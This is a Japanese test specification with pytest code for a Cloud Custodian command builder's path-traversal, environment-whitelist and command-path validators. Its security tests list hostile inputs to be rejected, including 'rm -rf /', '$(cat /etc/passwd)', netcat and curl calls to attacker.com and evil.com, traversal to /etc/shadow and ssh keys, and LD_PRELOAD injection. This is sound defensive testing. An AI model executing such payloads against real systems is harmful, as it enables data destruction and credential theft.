# jobs/tasks/new_custodian_scan/command_builder テストケース

## 1. 概要

`command_builder.py` は Cloud Custodian 実行用のコマンド引数・環境変数・ポリシーファイルを構築する `CustodianCommandBuilder` クラスを提供します。パストラバーサル防止、環境変数ホワイトリスト、コマンドパス検証などセキュリティ機能を含みます。

### 1.1 主要機能

| メソッド | 説明 |
|---------|------|
| `__init__` | job_id設定、TaskLogger初期化 |
| `build_command_for_region` | リージョン用コマンド一式構築（ポリシーファイル・出力ディレクトリ・環境変数・コマンド引数） |
| `_create_policy_file` | リージョン専用ポリシーYAMLファイルの作成 |
| `_prepare_environment_variables` | os.environからホワイトリストベースで環境変数準備 |
| `_build_command_args` | Custodianコマンド引数構築（Azure/AWS分岐あり） |
| `get_custodian_command_path` | Custodianコマンドパス取得（固定値） |
| `_validate_file_path` | パストラバーサル攻撃防止チェック |
| `_sanitize_environment_variables` | ホワイトリストベースの環境変数サニタイズ |
| `_is_safe_env_value` | 正規表現による環境変数値の安全性チェック |
| `_validate_command_path` | コマンドパスのパターンマッチ＋実行可能チェック |

### 1.2 カバレッジ目標: 90%

> **注記**: コマンド構築・環境変数サニタイズはセキュリティの中核。osモジュール依存が多く、ファイルI/Oのモックが必要。

### 1.3 主要ファイル

| ファイル | パス |
|---------|------|
| テスト対象 | `app/jobs/tasks/new_custodian_scan/command_builder.py` |
| テストコード | `test/unit/jobs/tasks/new_custodian_scan/test_command_builder.py` |

### 1.4 補足情報

#### 依存関係（モック対象）

```
command_builder.py ──→ os.makedirs, os.path.join, os.path.normpath, os.path.abspath
                   ──→ os.environ（環境変数取得）
                   ──→ os.path.isfile, os.access（コマンドパス検証）
                   ──→ open()（ファイル書き込み）
                   ──→ re.match（正規表現パターンマッチ）
                   ──→ common.error_handling.ValidationError
                   ──→ common.logging.TaskLogger
```

#### 主要分岐

| メソッド | 行 | 条件 | 結果 |
|---------|-----|------|------|
| `_build_command_args` | L123 | `cloud_provider == "azure"` | --regionオプション除外 |
| | L127 | else（AWS） | --region追加 |
| `_validate_file_path` | L151 | `".." in normalized_path` | ValidationError |
| | L155 | `not startswith(base_dir)` | ValidationError |
| `_sanitize_environment_variables` | L174 | `key in allowed_env_vars` | 許可 |
| | L176 | `_is_safe_env_value(value)` | 値検証 |
| | L178-179 | unsafe value | 除外+警告 |
| | L180-181 | not allowed | 除外+debug |
| `_is_safe_env_value` | L187 | `not value` | False |
| | L191 | regex match成功 | True |
| | L194 | else | False |
| `_validate_command_path` | L198 | `not command_path or ".." in` | False |
| | L211-213 | パターンマッチ成功 | True |
| | L217 | `isfile and access(X_OK)` | True |
| | L220-221 | Exception | False+警告 |
| | L223 | フォールスルー | False |

---

## 2. 正常系テストケース

| ID | テスト名 | 入力 | 期待結果 |
|----|---------|------|---------|
| NCCB-001 | CustodianCommandBuilder初期化 | job_id="test" | logger設定 |
| NCCB-002 | build_command_for_region AWS | AWS認証情報+us-east-1 | 4要素タプル返却 |
| NCCB-003 | build_command_for_region Azure | Azure認証情報+japaneast | --regionなしコマンド |
| NCCB-004 | _create_policy_file正常 | YAML内容+作業ディレクトリ | ファイルパス返却 |
| NCCB-005 | _prepare_environment_variables | AWS認証情報 | ホワイトリスト適用済み環境変数 |
| NCCB-006 | _build_command_args AWS | region="us-east-1" | --region含むargs |
| NCCB-007 | _build_command_args Azure | cloud_provider="azure" | --region含まないargs |
| NCCB-008 | get_custodian_command_path | なし | "custodian" |
| NCCB-009 | _sanitize_environment_variables 許可変数 | AWS_ACCESS_KEY_ID等 | そのまま通過 |
| NCCB-010 | _sanitize_environment_variables 除外 | DANGEROUS_VAR等 | 除外 |
| NCCB-011 | _sanitize_environment_variables 不正値除外 | value="; rm -rf /" | 除外+警告 |
| NCCB-012 | _is_safe_env_value 有効値 | "us-east-1" | True |
| NCCB-013 | _is_safe_env_value パス値 | "/usr/local/bin" | True |
| NCCB-014 | _validate_command_path "custodian" | "custodian" | True |
| NCCB-015 | _validate_command_path /usr/bin/custodian | "/usr/bin/custodian" | True |
| NCCB-016 | _validate_command_path ホームディレクトリ | "/home/user/.local/bin/custodian" | True |
| NCCB-017 | _validate_command_path 実行可能ファイル | 存在する実行可能パス | True |
| NCCB-018 | _validate_file_path 正常パス | base_dir内のパス | 例外なし |
| NCCB-019 | _validate_command_path /usr/local/bin | "/usr/local/bin/custodian" | True |
| NCCB-020 | _validate_command_path /opt/bin | "/opt/custom/bin/custodian" | True |
| NCCB-021 | _validate_command_path /app/bin | "/app/c7n/custodian" | True |

### 2.1 初期化テスト

```python
# test/unit/jobs/tasks/new_custodian_scan/test_command_builder.py
import pytest
import os
from unittest.mock import patch, MagicMock, mock_open


class TestCustodianCommandBuilderInit:
    """CustodianCommandBuilder初期化テスト"""

    def test_init_sets_attributes(self):
        """NCCB-001: CustodianCommandBuilder初期化

        command_builder.py:22-24 の初期化を検証。
        """
        # Arrange & Act
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger") as mock_logger_cls:
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            builder = CustodianCommandBuilder("test-cb")

        # Assert
        assert builder.job_id == "test-cb"
        mock_logger_cls.assert_called_once_with("test-cb", "CustodianCommandBuilder")
        assert builder.logger == mock_logger_cls.return_value
```

### 2.2 build_command_for_region テスト

```python
class TestBuildCommandForRegion:
    """build_command_for_regionテスト"""

    @pytest.fixture
    def builder(self):
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger"):
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            return CustodianCommandBuilder("test-bcr")

    @patch("os.makedirs")
    @patch("builtins.open", new_callable=mock_open)
    def test_build_aws_command(self, mock_file, mock_makedirs, builder):
        """NCCB-002: build_command_for_region AWS

        command_builder.py:26-66 のAWSフルパスを検証。
        """
        # Arrange
        builder._validate_file_path = MagicMock()
        aws_creds = {"AWS_ACCESS_KEY_ID": "AKIATEST", "AWS_DEFAULT_REGION": "us-east-1"}

        with patch.dict("os.environ", {"PATH": "/usr/bin", "HOME": "/home/test"}, clear=True):
            # Act
            cmd_args, env, policy_path, output_dir = builder.build_command_for_region(
                "policies:\n  - name: test", "us-east-1", aws_creds, "/tmp/work", "aws"
            )

        # Assert
        assert "--region" in cmd_args
        assert "us-east-1" in cmd_args
        assert "run" in cmd_args
        assert "--output-dir" in cmd_args
        assert env.get("AWS_ACCESS_KEY_ID") == "AKIATEST"
        assert policy_path.endswith(".yaml")
        assert "custodian_output" in output_dir
        # ログ出力を検証
        builder.logger.info.assert_called()

    @patch("os.makedirs")
    @patch("builtins.open", new_callable=mock_open)
    def test_build_azure_command(self, mock_file, mock_makedirs, builder):
        """NCCB-003: build_command_for_region Azure

        command_builder.py:26-66 のAzureパスを検証。
        --regionオプションが含まれないことを確認。
        """
        # Arrange
        builder._validate_file_path = MagicMock()
        azure_creds = {"AZURE_TENANT_ID": "tenant-123"}

        with patch.dict("os.environ", {"PATH": "/usr/bin"}, clear=True):
            # Act
            cmd_args, env, policy_path, output_dir = builder.build_command_for_region(
                "policies:\n  - name: test", "japaneast", azure_creds, "/tmp/work", "azure"
            )

        # Assert
        assert "--region" not in cmd_args
        assert "run" in cmd_args
        builder.logger.info.assert_called()
```

### 2.3 _create_policy_file テスト

```python
class TestCreatePolicyFile:
    """_create_policy_fileテスト"""

    @pytest.fixture
    def builder(self):
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger"):
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            return CustodianCommandBuilder("test-cpf")

    @patch("builtins.open", new_callable=mock_open)
    def test_create_policy_file(self, mock_file, builder):
        """NCCB-004: _create_policy_file正常

        command_builder.py:68-84 のファイル作成を検証。
        """
        # Arrange
        builder._validate_file_path = MagicMock()
        yaml_content = "policies:\n  - name: test-policy"

        # Act
        result = builder._create_policy_file(yaml_content, "/tmp/work", "us-east-1")

        # Assert
        assert result.endswith("policy_us-east-1.yaml")
        mock_file.assert_called_once()
        # ファイルにYAML内容が書き込まれたことを検証
        mock_file().write.assert_called_once_with(yaml_content)
        builder._validate_file_path.assert_called_once()
```

### 2.4 環境変数準備テスト

```python
class TestPrepareEnvironmentVariables:
    """_prepare_environment_variablesテスト"""

    @pytest.fixture
    def builder(self):
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger"):
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            return CustodianCommandBuilder("test-pev")

    def test_prepare_with_aws_credentials(self, builder):
        """NCCB-005: _prepare_environment_variables

        command_builder.py:86-105 の環境変数準備を検証。
        os.environからPATH/HOME等を取得し、AWS認証情報を追加。
        """
        # Arrange
        aws_creds = {
            "AWS_ACCESS_KEY_ID": "AKIATEST123",
            "AWS_SECRET_ACCESS_KEY": "secretkey123",
            "AWS_DEFAULT_REGION": "us-east-1",
        }

        with patch.dict("os.environ", {"PATH": "/usr/bin", "HOME": "/home/test", "DANGEROUS": "bad"}, clear=True):
            # Act
            result = builder._prepare_environment_variables(aws_creds)

        # Assert（ホワイトリスト通過したもののみ）
        assert result.get("AWS_ACCESS_KEY_ID") == "AKIATEST123"
        assert result.get("PATH") == "/usr/bin"
        assert "DANGEROUS" not in result
        # ログ出力を検証
        builder.logger.info.assert_called()
```

### 2.5 _build_command_args テスト

```python
class TestBuildCommandArgs:
    """_build_command_argsテスト"""

    @pytest.fixture
    def builder(self):
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger"):
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            return CustodianCommandBuilder("test-bca")

    def test_aws_command_includes_region(self, builder):
        """NCCB-006: _build_command_args AWS

        command_builder.py:127-130 のAWS分岐を検証。
        """
        # Arrange & Act
        result = builder._build_command_args("/tmp/policy.yaml", "/tmp/output", "us-east-1", "aws")

        # Assert
        assert result == ["run", "--output-dir", "/tmp/output", "--verbose", "--region", "us-east-1", "/tmp/policy.yaml"]

    def test_azure_command_excludes_region(self, builder):
        """NCCB-007: _build_command_args Azure

        command_builder.py:123-126 のAzure分岐を検証。
        --regionオプションが含まれないことを確認。
        """
        # Arrange & Act
        result = builder._build_command_args("/tmp/policy.yaml", "/tmp/output", "japaneast", "azure")

        # Assert
        assert "--region" not in result
        assert result == ["run", "--output-dir", "/tmp/output", "--verbose", "/tmp/policy.yaml"]

    def test_get_custodian_command_path(self, builder):
        """NCCB-008: get_custodian_command_path

        command_builder.py:140-144 の固定パス返却を検証。
        """
        # Arrange & Act
        result = builder.get_custodian_command_path()

        # Assert
        assert result == "custodian"
        builder.logger.info.assert_called_once()
```

### 2.6 _sanitize_environment_variables テスト

```python
class TestSanitizeEnvironmentVariables:
    """_sanitize_environment_variablesテスト"""

    @pytest.fixture
    def builder(self):
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger"):
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            return CustodianCommandBuilder("test-sev")

    def test_allowed_vars_pass_through(self, builder):
        """NCCB-009: _sanitize_environment_variables 許可変数

        command_builder.py:173-177 のホワイトリスト通過パスを検証。
        """
        # Arrange
        env = {
            "AWS_ACCESS_KEY_ID": "AKIATEST",
            "AWS_SECRET_ACCESS_KEY": "secretkey",
            "AWS_DEFAULT_REGION": "us-east-1",
            "PATH": "/usr/bin",
        }

        # Act
        result = builder._sanitize_environment_variables(env)

        # Assert
        assert result["AWS_ACCESS_KEY_ID"] == "AKIATEST"
        assert result["PATH"] == "/usr/bin"
        assert len(result) == 4

    def test_non_allowed_vars_filtered(self, builder):
        """NCCB-010: _sanitize_environment_variables 除外

        command_builder.py:180-181 の非許可変数除外を検証。
        """
        # Arrange
        env = {
            "AWS_ACCESS_KEY_ID": "AKIATEST",
            "DANGEROUS_VAR": "malicious",
            "LD_PRELOAD": "/evil/lib.so",
        }

        # Act
        result = builder._sanitize_environment_variables(env)

        # Assert
        assert "DANGEROUS_VAR" not in result
        assert "LD_PRELOAD" not in result
        assert "AWS_ACCESS_KEY_ID" in result
        # 非許可変数のdebugログを検証
        builder.logger.debug.assert_called()

    def test_unsafe_values_filtered(self, builder):
        """NCCB-011: _sanitize_environment_variables 不正値除外

        command_builder.py:176-179 の不正値フィルタリングを検証。
        ホワイトリストに含まれるキーでも値が不正なら除外。
        """
        # Arrange
        env = {
            "AWS_ACCESS_KEY_ID": "; rm -rf /",
            "PATH": "/usr/bin",
        }

        # Act
        result = builder._sanitize_environment_variables(env)

        # Assert
        assert "AWS_ACCESS_KEY_ID" not in result
        assert result["PATH"] == "/usr/bin"
        # 警告ログが出力されたことを検証
        builder.logger.warning.assert_called()
```

### 2.7 _is_safe_env_value テスト

```python
class TestIsSafeEnvValue:
    """_is_safe_env_valueテスト"""

    @pytest.fixture
    def builder(self):
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger"):
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            return CustodianCommandBuilder("test-isev")

    def test_valid_region_value(self, builder):
        """NCCB-012: _is_safe_env_value 有効値

        command_builder.py:191 の正規表現マッチ成功を検証。
        """
        # Arrange & Act & Assert
        assert builder._is_safe_env_value("us-east-1") is True

    def test_valid_path_value(self, builder):
        """NCCB-013: _is_safe_env_value パス値

        command_builder.py:191 のスラッシュ含むパス値を検証。
        """
        # Arrange & Act & Assert
        assert builder._is_safe_env_value("/usr/local/bin:/usr/bin") is True
```

### 2.8 _validate_command_path テスト

```python
class TestValidateCommandPath:
    """_validate_command_pathテスト"""

    @pytest.fixture
    def builder(self):
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger"):
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            return CustodianCommandBuilder("test-vcp")

    def test_simple_custodian(self, builder):
        """NCCB-014: _validate_command_path "custodian"

        command_builder.py:203 の^custodian$パターンを検証。
        """
        # Arrange & Act & Assert
        assert builder._validate_command_path("custodian") is True

    def test_usr_bin_path(self, builder):
        """NCCB-015: _validate_command_path /usr/bin/custodian

        command_builder.py:204 の/usr/bin/custodianパターンを検証。
        """
        # Arrange & Act & Assert
        assert builder._validate_command_path("/usr/bin/custodian") is True

    def test_home_local_bin_path(self, builder):
        """NCCB-016: _validate_command_path ホームディレクトリ

        command_builder.py:206 の/home/{user}/.local/bin/custodianパターンを検証。
        """
        # Arrange & Act & Assert
        assert builder._validate_command_path("/home/testuser/.local/bin/custodian") is True

    def test_executable_file_path(self, builder):
        """NCCB-017: _validate_command_path 実行可能ファイル

        command_builder.py:217-218 のisfile+accessチェックを検証。
        パターンマッチしないが実行可能なファイルの場合。
        """
        # Arrange
        with patch("os.path.isfile", return_value=True), \
             patch("os.access", return_value=True):
            # Act & Assert
            assert builder._validate_command_path("/custom/path/custodian") is True
            # ログ出力を検証
            builder.logger.info.assert_called()

    def test_validate_file_path_valid(self, builder):
        """NCCB-018: _validate_file_path 正常パス

        command_builder.py:146-156 の正常パスを検証。
        """
        # Arrange
        with patch("os.path.abspath", return_value="/tmp/work"):
            # Act（例外が発生しないことを確認）
            builder._validate_file_path("/tmp/work/policy.yaml", "/tmp/work")

        # Assert（例外なしで完了）

    def test_usr_local_bin_path(self, builder):
        """NCCB-019: _validate_command_path /usr/local/bin

        command_builder.py:205 の/usr/local/bin/custodianパターンを検証。
        """
        # Arrange & Act & Assert
        assert builder._validate_command_path("/usr/local/bin/custodian") is True

    def test_opt_bin_path(self, builder):
        """NCCB-020: _validate_command_path /opt/bin

        command_builder.py:207 の/opt/[^/]+/bin/custodianパターンを検証。
        """
        # Arrange & Act & Assert
        assert builder._validate_command_path("/opt/custom/bin/custodian") is True

    def test_app_bin_path(self, builder):
        """NCCB-021: _validate_command_path /app/bin

        command_builder.py:208 の/app/[^/]*/custodianパターンを検証。
        """
        # Arrange & Act & Assert
        assert builder._validate_command_path("/app/c7n/custodian") is True
```

---

## 3. 異常系テストケース

| ID | テスト名 | 入力 | 期待結果 |
|----|---------|------|---------|
| NCCB-E01 | _validate_file_path パストラバーサル | "../etc/passwd" | ValidationError |
| NCCB-E02 | _validate_file_path ベースディレクトリ外 | "/etc/passwd" | ValidationError |
| NCCB-E03 | _is_safe_env_value 空文字 | "" | False |
| NCCB-E04 | _is_safe_env_value シェルメタキャラクタ | "; rm -rf /" | False |
| NCCB-E05 | _is_safe_env_value スペース含む値 | "us east 1" | False |
| NCCB-E06 | _validate_command_path 空文字 | "" | False |
| NCCB-E07 | _validate_command_path パストラバーサル | "../custodian" | False |
| NCCB-E08 | _validate_command_path 非マッチパターン | "/malicious/path" | False |
| NCCB-E09 | _validate_command_path アクセスチェック例外 | isfile例外 | False+警告 |
| NCCB-E10 | _validate_command_path 実行権限なし | isfile=True, access=False | False |

### 3.1 _validate_file_path 異常系

```python
class TestValidateFilePathErrors:
    """_validate_file_pathエラーテスト"""

    @pytest.fixture
    def builder(self):
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger"):
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            return CustodianCommandBuilder("test-vfp-err")

    def test_path_traversal_attack(self, builder):
        """NCCB-E01: _validate_file_path パストラバーサル

        command_builder.py:151-152 の".."検出をカバー。
        """
        # Arrange
        from app.jobs.common.error_handling import ValidationError

        # Act & Assert
        with pytest.raises(ValidationError, match="パストラバーサル攻撃|ベースディレクトリ外"):
            builder._validate_file_path("/tmp/work/../etc/passwd", "/tmp/work")

    def test_outside_base_directory(self, builder):
        """NCCB-E02: _validate_file_path ベースディレクトリ外

        command_builder.py:155-156 のベースディレクトリ外アクセスをカバー。
        """
        # Arrange
        from app.jobs.common.error_handling import ValidationError

        with patch("os.path.abspath", return_value="/tmp/work"):
            # Act & Assert
            with pytest.raises(ValidationError, match="ベースディレクトリ外"):
                builder._validate_file_path("/etc/passwd", "/tmp/work")
```

### 3.2 _is_safe_env_value 異常系

```python
class TestIsSafeEnvValueErrors:
    """_is_safe_env_valueエラーテスト"""

    @pytest.fixture
    def builder(self):
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger"):
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            return CustodianCommandBuilder("test-isev-err")

    def test_empty_value(self, builder):
        """NCCB-E03: _is_safe_env_value 空文字

        command_builder.py:187-188 の空値チェックをカバー。
        """
        # Arrange & Act & Assert
        assert builder._is_safe_env_value("") is False

    def test_shell_metacharacters(self, builder):
        """NCCB-E04: _is_safe_env_value シェルメタキャラクタ

        command_builder.py:191-194 の正規表現不一致をカバー。
        """
        # Arrange & Act & Assert
        assert builder._is_safe_env_value("; rm -rf /") is False

    def test_space_in_value(self, builder):
        """NCCB-E05: _is_safe_env_value スペース含む値

        command_builder.py:191 の正規表現でスペースが許可されないことを検証。
        """
        # Arrange & Act & Assert
        assert builder._is_safe_env_value("us east 1") is False
```

### 3.3 _validate_command_path 異常系

```python
class TestValidateCommandPathErrors:
    """_validate_command_pathエラーテスト"""

    @pytest.fixture
    def builder(self):
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger"):
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            return CustodianCommandBuilder("test-vcp-err")

    def test_empty_path(self, builder):
        """NCCB-E06: _validate_command_path 空文字

        command_builder.py:198 のnot command_pathチェックをカバー。
        """
        # Arrange & Act & Assert
        assert builder._validate_command_path("") is False

    def test_path_traversal(self, builder):
        """NCCB-E07: _validate_command_path パストラバーサル

        command_builder.py:198 の".."チェックをカバー。
        """
        # Arrange & Act & Assert
        assert builder._validate_command_path("../custodian") is False

    def test_non_matching_pattern(self, builder):
        """NCCB-E08: _validate_command_path 非マッチパターン

        command_builder.py:211-213 のパターンマッチ失敗＋L217のisfileもFalseのケース。
        """
        # Arrange
        with patch("os.path.isfile", return_value=False):
            # Act & Assert
            assert builder._validate_command_path("/malicious/path/evil") is False

    def test_access_check_exception(self, builder):
        """NCCB-E09: _validate_command_path アクセスチェック例外

        command_builder.py:220-221 のException分岐をカバー。
        """
        # Arrange
        with patch("os.path.isfile", side_effect=OSError("Permission denied")):
            # Act
            result = builder._validate_command_path("/some/path/custodian")

        # Assert
        assert result is False
        builder.logger.warning.assert_called()

    def test_no_execute_permission(self, builder):
        """NCCB-E10: _validate_command_path 実行権限なし

        command_builder.py:217 のisfile=True但しaccess=Falseの分岐をカバー。
        """
        # Arrange
        with patch("os.path.isfile", return_value=True), \
             patch("os.access", return_value=False):
            # Act & Assert
            assert builder._validate_command_path("/custom/path/custodian") is False
```

---

## 4. セキュリティテストケース

| ID | テスト名 | 入力 | 期待結果 |
|----|---------|------|---------|
| NCCB-SEC-01 | パストラバーサル防止（複合パターン） | 複数のトラバーサルパターン | 全てValidationError |
| NCCB-SEC-02 | 環境変数ホワイトリスト強制 | 危険な環境変数 | 全て除外 |
| NCCB-SEC-03 | コマンドインジェクション防止 | シェルメタキャラクタ含む値 | 全てFalse |
| NCCB-SEC-04 | LD_PRELOAD等の危険変数除外 | LD_PRELOAD, LD_LIBRARY_PATH | 除外 |

```python
@pytest.mark.security
class TestCommandBuilderSecurity:
    """CustodianCommandBuilderセキュリティテスト"""

    @pytest.fixture
    def builder(self):
        with patch("app.jobs.tasks.new_custodian_scan.command_builder.TaskLogger"):
            from app.jobs.tasks.new_custodian_scan.command_builder import CustodianCommandBuilder
            return CustodianCommandBuilder("test-sec")

    def test_path_traversal_patterns(self, builder):
        """NCCB-SEC-01: パストラバーサル防止（複合パターン）

        command_builder.py:146-156 の複数パターンでの防御を検証。
        """
        # Arrange
        from app.jobs.common.error_handling import ValidationError
        traversal_paths = [
            "/tmp/work/../etc/passwd",
            "/tmp/work/../../root/.ssh/id_rsa",
            "/tmp/work/subdir/../../etc/shadow",
        ]

        # Act & Assert
        for path in traversal_paths:
            with pytest.raises(ValidationError):
                builder._validate_file_path(path, "/tmp/work")

    def test_env_whitelist_enforcement(self, builder):
        """NCCB-SEC-02: 環境変数ホワイトリスト強制

        command_builder.py:162-171 のホワイトリスト外変数が全て除外されることを検証。
        """
        # Arrange
        dangerous_env = {
            "AWS_ACCESS_KEY_ID": "AKIATEST",
            "LD_PRELOAD": "/evil/lib.so",
            "LD_LIBRARY_PATH": "/evil/lib",
            "PYTHONSTARTUP": "/evil/startup.py",
            "http_proxy": "http://evil.proxy",
            "SHELL": "/bin/evil",
        }

        # Act
        result = builder._sanitize_environment_variables(dangerous_env)

        # Assert（ホワイトリストのAWS_ACCESS_KEY_IDのみ通過）
        assert "AWS_ACCESS_KEY_ID" in result
        assert "LD_PRELOAD" not in result
        assert "LD_LIBRARY_PATH" not in result
        assert "PYTHONSTARTUP" not in result
        assert "http_proxy" not in result
        assert "SHELL" not in result

    def test_command_injection_prevention(self, builder):
        """NCCB-SEC-03: コマンドインジェクション防止

        command_builder.py:185-194 のシェルメタキャラクタ拒否を検証。
        """
        # Arrange
        injection_values = [
            "; rm -rf /",
            "$(cat /etc/passwd)",
            "`whoami`",
            "| nc attacker.com 1234",
            "&& curl http://evil.com",
            "\n/bin/sh",
        ]

        # Act & Assert
        for value in injection_values:
            assert builder._is_safe_env_value(value) is False, f"'{value}' should be rejected"

    def test_dangerous_env_vars_excluded(self, builder):
        """NCCB-SEC-04: LD_PRELOAD等の危険変数除外

        command_builder.py:162-183 のホワイトリストに含まれない危険な環境変数を検証。
        LD_PRELOADは共有ライブラリインジェクション、PYTHONSTARTUP等は任意コード実行に悪用可能。
        """
        # Arrange
        env = {
            "LD_PRELOAD": "/tmp/evil.so",
            "LD_LIBRARY_PATH": "/tmp/evil",
            "DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib",
            "BASH_ENV": "/tmp/evil.sh",
            "ENV": "/tmp/evil.sh",
            "PATH": "/usr/bin",
        }

        # Act
        result = builder._sanitize_environment_variables(env)

        # Assert（PATHのみ通過、危険変数は全て除外）
        assert list(result.keys()) == ["PATH"]
```

---

## 5. フィクスチャ

| フィクスチャ名 | 用途 | スコープ | autouse |
|--------------|------|---------|---------|
| `builder` | 各テストクラス内のCustodianCommandBuilderインスタンス（TaskLoggerモック済み） | function | No |

### フィクスチャ方針

```python
# test/unit/jobs/tasks/new_custodian_scan/conftest.py（既存に追記）
# フィクスチャ方針:
# - CustodianCommandBuilderはステートレスなクラスのため、
#   autouseリセットフィクスチャは不要。
# - 各テストクラスでTaskLoggerをモックしたbuilderフィクスチャを個別に定義。
# - osモジュール関数（makedirs, open等）はテストメソッド内で個別にパッチ。
# - os.environはpatch.dict形式でパッチ（patch.dict("os.environ", {...}, clear=True)）。
```

---

## 6. テスト実行例

```bash
# command_builder関連テストのみ実行
pytest test/unit/jobs/tasks/new_custodian_scan/test_command_builder.py -v

# 特定クラスのみ
pytest test/unit/jobs/tasks/new_custodian_scan/test_command_builder.py::TestBuildCommandArgs -v

# カバレッジ付き
pytest test/unit/jobs/tasks/new_custodian_scan/test_command_builder.py \
  --cov=app.jobs.tasks.new_custodian_scan.command_builder \
  --cov-report=term-missing -v

# セキュリティマーカーで実行
pytest test/unit/jobs/tasks/new_custodian_scan/test_command_builder.py -m "security" -v
```

---

## 7. テストケース一覧（サマリー）

| カテゴリ | 件数 | ID範囲 |
|---------|------|--------|
| 正常系 | 21 | NCCB-001 〜 NCCB-021 |
| 異常系 | 10 | NCCB-E01 〜 NCCB-E10 |
| セキュリティ | 4 | NCCB-SEC-01 〜 NCCB-SEC-04 |
| **合計** | **35** | - |

### テストクラス構成

| クラス名 | テストID | 件数 |
|---------|---------|------|
| `TestCustodianCommandBuilderInit` | NCCB-001 | 1 |
| `TestBuildCommandForRegion` | NCCB-002〜NCCB-003 | 2 |
| `TestCreatePolicyFile` | NCCB-004 | 1 |
| `TestPrepareEnvironmentVariables` | NCCB-005 | 1 |
| `TestBuildCommandArgs` | NCCB-006〜NCCB-008 | 3 |
| `TestSanitizeEnvironmentVariables` | NCCB-009〜NCCB-011 | 3 |
| `TestIsSafeEnvValue` | NCCB-012〜NCCB-013 | 2 |
| `TestValidateCommandPath` | NCCB-014〜NCCB-021 | 8 |
| `TestValidateFilePathErrors` | NCCB-E01〜NCCB-E02 | 2 |
| `TestIsSafeEnvValueErrors` | NCCB-E03〜NCCB-E05 | 3 |
| `TestValidateCommandPathErrors` | NCCB-E06〜NCCB-E10 | 5 |
| `TestCommandBuilderSecurity` | NCCB-SEC-01〜NCCB-SEC-04 | 4 |

### 実装失敗が予想されるテスト

| テストID | 理由 | 確定対応手順 |
|---------|------|-------------|
| NCCB-E01 | `os.path.normpath("/tmp/work/../etc/passwd")`は`"/tmp/etc/passwd"`に解決され、`".." in normalized_path`が偽になるため、L151のチェックをパスしてしまう。ただしL155の`startswith(base_dir)`チェックで防御される可能性あり | テスト実行時に`normpath`の動作を確認。L151で検出されない場合はL155のフォールバック検出を検証。両方失敗する場合は実装を`os.path.realpath`ベースに修正 |
| NCCB-002/003 | `_prepare_environment_variables`内で`os.environ`を参照するため、テスト環境の環境変数に依存。パッチの適用位置が重要 | `os.environ`をdict形式でパッチし、テスト環境の影響を排除 |
| NCCB-SEC-01 | NCCB-E01と同様、`normpath`が".."を解決する場合の動作確認が必要 | 実装のパストラバーサル検出ロジック確認後、テストケースを調整 |

### 注意事項

- テストID命名: `NCCB-XXX`（連番）を基本とする
- `os.makedirs`、`os.environ`、`builtins.open`は各テストで個別にパッチ
- `_validate_file_path`は`os.path.normpath`と`os.path.abspath`に依存するため、パッチ適用に注意
- `@pytest.mark.security`マーカーの登録が必要（`pyproject.toml`に`markers = ["security: セキュリティテスト"]`を追加）
- 非asyncモジュールのため`pytest-asyncio`は不要

---

## 8. 既知の制限事項

| # | 制限事項 | 影響 | 対応策 |
|---|---------|------|--------|
| 1 | `os.path.normpath`が".."を解決するため、`/tmp/work/../etc/passwd`が`/tmp/etc/passwd`になり".."が残らない場合がある | パストラバーサル検出が機能しない可能性 | テスト実行時に動作確認。検出されない場合は`os.path.realpath`ベースの検証に変更を推奨 |
| 2 | `_is_safe_env_value`の正規表現がスペースを許可しないため、スペース含むPATH値（Windowsパスなど）が除外される | Windows環境での動作制限 | Linux環境での使用を前提とする（現状で問題なし） |
| 3 | `_validate_command_path`のパターンは有限リスト | 新しいインストールパスが追加された場合に検証失敗 | isfile+access のフォールバックでカバー（L217） |
| 4 | `build_command_for_region`はファイルI/O（makedirs, open）を実行 | テストではモック必須 | os.makedirs/builtins.openをパッチ |
